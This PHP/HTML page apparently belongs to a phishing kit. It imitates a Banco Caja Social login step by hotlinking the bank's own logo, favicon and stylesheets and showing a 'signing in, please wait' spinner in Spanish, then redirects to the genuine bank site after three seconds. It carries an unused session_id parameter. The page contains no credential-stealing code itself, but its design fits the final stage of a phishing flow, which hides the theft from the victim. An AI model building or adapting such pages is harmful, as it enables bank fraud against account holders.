<?php
$sid = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_GET['session_id'] ?? '');
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Banco Caja Social</title>
    <link rel="icon" type="image/x-icon" href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/favicon.ico">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-theme/dist/backbase-theme.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/bcs.7.css" rel="stylesheet">
    <style>
        body {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #f5f5f5;
            font-family: 'Libre Franklin', sans-serif;
        }

        .wrapper {
            text-align: center;
            padding: 40px;
        }

        .logo {
            width: 160px;
            margin-bottom: 32px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .spinner {
            width: 52px;
            height: 52px;
            border: 5px solid #e0e0e0;
            border-top-color: #0033A0;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin: 0 auto 24px;
        }

        p {
            color: #444;
            font-size: 15px;
            margin: 0;
        }
    </style>
</head>

<body>
    <div class="wrapper">
        <img class="logo" src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/logoBCSLine.svg" alt="Banco Caja Social">
        <div class="spinner"></div>
        <p>Iniciando sesión, por favor espere...</p>
    </div>
    <script>
        setTimeout(() => {
            window.location.href = 'https://bancapersonas.bancocajasocial.com';
        }, 3000);
    </script>
</body>

</html>